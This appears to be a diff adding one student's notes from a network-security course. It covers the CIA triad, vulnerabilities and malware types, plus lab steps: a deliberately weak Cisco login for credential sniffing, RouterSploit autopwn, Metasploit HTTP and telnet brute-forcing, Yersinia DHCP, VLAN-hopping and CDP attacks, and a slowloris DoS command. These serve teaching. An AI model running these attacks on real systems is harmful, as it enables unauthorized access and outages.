@@ -1,0 +1,220 @@
+sudo ip route del 0.0.0.0/0 via 10.12.1.4
+sudo ifconfig eth0 192.168.1.2 netmask 255.255.255.0
+sudo route add default gw 192.168.1.2 eth0
+echo "nameserver 1.1.1.1" > /etc/resolv.conf  
+
+
+
+TASK1: learn C-I-A
+Confidentiality:
+-1st goal:
+- data is not visible to just anyone and protect data i storage or in motion
+  thus protecting business data.
+- data is for intended and authorized persons
+- encryption protects: data/system confidentiality
+- RAS and S2S VPN protects data in transit
+
+DEMO: ras, site 2 site and storage encryption.
+
+use bitlocker to go, to encrypt usb harddrive.
+ 
+Integrity:
+-Ensures maintaining and assuring accuracy of consistent data
+-Ability to make sure that has not been altered or changed/data is Orig!
+-data recieved is the SAMe as the data sent by the sender
+
+Demo: md5 or sha1/sha256
+
+Availability:
+- systems, Applications, Data must be avialable to users
+- resilient systems, virtualization, clustering, enviromentalt controls
+  and incident response
+  
+DFS and Clustering demo  
+  
+C: data private/secure + I:data not changed + A: can access data
+
+mkdir –p /etc/ssh/original_keys
+
+mv /etc/ssh/ssh_host_* /etc/ssh/original_keys
+
+cd /etc/ssh
+
+Generate new keys
+dpkg-reconfigure openssh-server
+
+service ssh start
+
+service ssh restart
+
+Task2: Protect digital assests;
+
+building, vehichel, machines, laptops, Ingible assest:
+
+task2.1: Vulnerability: cve database
+is a weakness in asystem or its design, every system is human create thus
+prone to erros, there are vulnerabilities in apps, network protocols,
+OS, etc. an attacker can gain acces to a organization thru exploits
+
+
+https://cve.mitre.org
+
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1338
+
+Task2.2: Exploit:
+
+conf t
+int vlan 1
+ip add 10.1.0.4 255.255.255.0
+no shut
+exit
+ip http server
+line vty 0 14
+ transport input all
+ password pass
+ip http authentication local
+username admin privilege 15 password pass
+
+use wireshark:
+http: 10.1.0.4
+
+filter: http
+        GET
+		authorization
+
+Exploits: are ways used to attack a vulnerability to cause damage to a systems,
+can be buffer overflow or social eng to hack a password.
+
+Threat: are anything dagner to an asset:
+key loggers, spyware, hackers, virues, lockups, data lost, identify theft,
+trojan, root kits, etc..
+
+Attack: 
+
+Risks: = Asset + threat + vulnerability
+
+CounterMeasure:  is an action initiated by the organizatiopn typically to mititgate
+  a threat.
+  
+telnet, http, snmp --> https(contermeasure)
+
+"explain" Cisco of RISK
+
+Task3: On-premise vs On-cloud:
+
+Cloud: 
+is hosted on servers by aws, azure, gcp
+3rd party responsible for managing and securing Infa
+
+On pre vs Iaas   vs  Paas  vs  Saas (Infographic)
+
+Malware: 
+malicious Software is a file or code or app.
+Malware: adware, scareware, botnets, logicbombs, keyloggers, etc..
+virus, wordms, trojans, rootkits, Spyware.
+
+Virus: 'create a virus!"
+- malicios code at attach needs human toactivate it.
+
+Worms: are malware that replicate themselves and spread to infect other systems
+
+Adware:  https://geekprank.com/
+
+RansomeWare: "demo"
+
+Keylogger: blackboxexpress
+
+DEMO: 
+Sql injection
+and
+XSS scripting
+
+http://pentestdiary.blogspot.com/2017/08/cisco-network-penetration-testing.html
+
+https://www.youtube.com/watch?v=OIqIKImSDnE
+
+Installation on Linux:
+apt-get install python3-pip
+git clone https://github.com/threat9/routersploit
+cd routersploit
+python3 -m pip install -r requirements.txt
+python3 rsf.py
+
+
+show all
+show exploits
+search cisco
+search device=cameras
+search scanners 
+use scanners/autopwn or
+>show options
+set target 192.168.108.135
+run
+back
+
+
+!!@@//HTTP LOGIN BRUTE FORCE SCRIPT
+
+sudo su
+msfconsole
+use auxiliary/scanner/http/http_login
+show options
+set BRUTEFORCE_SPEED 5
+set HttpUsername admin
+set PASS_FILE /home/kali/Downloads/Rivan Seclist/Passwords/2023-200_most_umssssed_passwords.txt
+set RHOSTS <target ip>
+set RPORT 80
+set STOP_ON_SUCCESS true
+show options
+run
+
+sudo su
+msfconsole
+use auxiliary/scanner/telnet/telnet_login
+show options
+set BRUTEFORCE_SPEED 5
+set USERNAME admin
+set PASS_FILE /home/kali/Downloads/Rivan Seclist/Passwords/2023-200_most_used_passwords.txt
+set RHOSTS <target ip>
+set RPORT 23
+show options
+run
+
+stp attacks
+arp spoofing
+mac spoofing
+MAC overflows
+cdp/lldp recon
+vlan hopping
+dhcp spoofing
+
+
+Yersinia -G
+dhcp
+ LaunchAttack
+  sending DISCOVER packet
+    show mac address-table
+     
+VlanHoppingAttack:
+sw#show int status
+yersinia -G
+ dtp
+  launchAttack
+   enable trunking
+   
+CDP attack:
+show process cpu | 
+attack
+ cdp
+  floodcdp
+show process cpu | inc uti
+
+DOS:
+https://github.com/gkbrk/slowloris
+
+python3 slowloris.py 10.12.1.4 -p 80 -s 1000 --sleeptime 5
+
+
+TASK3:
+AUTO SECURE
+
